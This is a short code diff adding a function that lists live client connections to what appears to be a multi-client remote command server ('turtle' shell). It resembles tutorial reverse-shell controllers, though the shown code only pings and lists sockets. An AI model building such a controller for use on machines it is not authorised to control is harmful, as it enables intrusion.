@@ -80,7 +80,19 @@ def start_turtle():
         else:
             print("Command not recognized")
 
-
+#displays all current connections
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
+    print('------- Clients -------' + '\n' + results)
 
 #send commands
 #def send_commands(conn):
